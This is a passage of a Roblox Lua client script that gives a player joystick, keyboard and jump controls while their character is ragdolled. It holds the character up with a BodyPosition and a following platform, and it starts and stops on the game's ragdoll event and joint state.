        local direction = delta.Magnitude > 0 and delta.Unit or Vector2.new(0, 0)
        
        if delta.Magnitude > 0 then
            joystickInner.Position = UDim2.new(0.5, direction.X * distance - 35, 0.5, direction.Y * distance - 35)
            moveDirection = direction * (distance / maxRadius)
        else
            joystickInner.Position = UDim2.new(0.5, -35, 0.5, -35)
            moveDirection = Vector2.new(0, 0)
        end
    end

    joystickOuter.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            touchInput = input
            updateJoystick(input)
        end
    end)

    joystickOuter.InputChanged:Connect(function(input)
        if dragging and input == touchInput then
            updateJoystick(input)
        end
    end)

    joystickOuter.InputEnded:Connect(function(input)
        if input == touchInput then
            dragging = false
            touchInput = nil
            joystickInner.Position = UDim2.new(0.5, -35, 0.5, -35)
            moveDirection = Vector2.new(0, 0)
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and input == touchInput then
            updateJoystick(input)
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input == touchInput then
            dragging = false
            touchInput = nil
            joystickInner.Position = UDim2.new(0.5, -35, 0.5, -35)
            moveDirection = Vector2.new(0, 0)
        end
    end)

    jumpButton.Activated:Connect(function()
        if isRagdolled and rootPart then
            rootPart.AssemblyLinearVelocity = rootPart.AssemblyLinearVelocity + Vector3.new(0, 25, 0)
        end
    end)

    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if not isRagdolled then return end
        
        if input.KeyCode == Enum.KeyCode.W then
            moveDirection = Vector2.new(moveDirection.X, 1)
        elseif input.KeyCode == Enum.KeyCode.S then
            moveDirection = Vector2.new(moveDirection.X, -1)
        elseif input.KeyCode == Enum.KeyCode.A then
            moveDirection = Vector2.new(-1, moveDirection.Y)
        elseif input.KeyCode == Enum.KeyCode.D then
            moveDirection = Vector2.new(1, moveDirection.Y)
        elseif input.KeyCode == Enum.KeyCode.Space then
            rootPart.AssemblyLinearVelocity = rootPart.AssemblyLinearVelocity + Vector3.new(0, 25, 0)
        end
    end)

    UserInputService.InputEnded:Connect(function(input, gameProcessed)
        if not isRagdolled then return end
        
        if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.S then
            moveDirection = Vector2.new(moveDirection.X, 0)
        elseif input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.D then
            moveDirection = Vector2.new(0, moveDirection.Y)
        end
    end)

    local function setupRagdoll()
        if isRagdolled then return end
        isRagdolled = true

        initialHeight = rootPart.Position.Y
        
        if isMobile then
            joystickOuter.Visible = true
            jumpButton.Visible = true
        end

        bodyPos = Instance.new("BodyPosition")
        bodyPos.MaxForce = Vector3.new(0, 5000, 0)
        bodyPos.D = 800
        bodyPos.P = 5000
        bodyPos.Position = Vector3.new(rootPart.Position.X, initialHeight + 1, rootPart.Position.Z)
        bodyPos.Parent = rootPart

        platform = Instance.new("Part")
        platform.Size = Vector3.new(12, 1, 12)
        platform.Anchored = true
        platform.CanCollide = true
        platform.Transparency = 0.8
        platform.Material = Enum.Material.SmoothPlastic
        platform.Color = Color3.fromRGB(100, 100, 255)
        platform.Name = "RagdollPlatform"
        platform.Parent = workspace
        platform.Position = Vector3.new(rootPart.Position.X, initialHeight - 4, rootPart.Position.Z)
    end

    local function cleanupRagdoll()
        if not isRagdolled then return end
        isRagdolled = false
        moveDirection = Vector2.new(0, 0)
        
        joystickOuter.Visible = false
        jumpButton.Visible = false

        if bodyPos then
            bodyPos:Destroy()
            bodyPos = nil
        end

        if platform then
            platform:Destroy()
            platform = nil
        end
    end

    local ragdollEvent = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Ragdoll"):WaitForChild("Ragdoll")
    ragdollEvent.OnClientEvent:Connect(function(arg1, arg2)
        if arg2 == "manualM" then
            setupRagdoll()
        end
    end)

    local function findMotors()
        motors = {}
        for _, desc in pairs(character:GetDescendants()) do
            if desc:IsA("Motor6D") then
                table.insert(motors, desc)
            end
        end
    end

    local function checkRagdollEnded()
        local enabledCount = 0
        for _, motor in pairs(motors) do
            if motor.Parent and motor.Enabled == true then
                enabledCount = enabledCount + 1
            end
        end
        return enabledCount >= 3
    end

    findMotors()

    RunService.Heartbeat:Connect(function()
        if not character or not character.Parent or humanoid.Health <= 0 then return end

        if isRagdolled and checkRagdollEnded() then
            cleanupRagdoll()
        end

        if isRagdolled then
            if bodyPos then
                bodyPos.Position = Vector3.new(rootPart.Position.X, initialHeight + 1, rootPart.Position.Z)
            end

            if platform then
                platform.Position = Vector3.new(rootPart.Position.X, initialHeight - 4, rootPart.Position.Z)
            end

            if moveDirection.Magnitude > 0 then
                local camera = workspace.CurrentCamera
                local camCF = camera.CFrame

                local forward = camCF.LookVector
                local right = camCF.RightVector

                local moveX = right * moveDirection.X
                local moveZ = forward * -moveDirection.Y

                local finalDir = (moveX + moveZ)
                local flatDir = Vector3.new(finalDir.X, 0, finalDir.Z).Unit

                rootPart.Velocity = flatDir * moveSpeed
            else
                rootPart.Velocity = Vector3.new(0, rootPart.Velocity.Y, 0)
            end
        end
    end)
end

if player.Character then
    initRagdollControls()
end

player.CharacterAdded:Connect(initRagdollControls)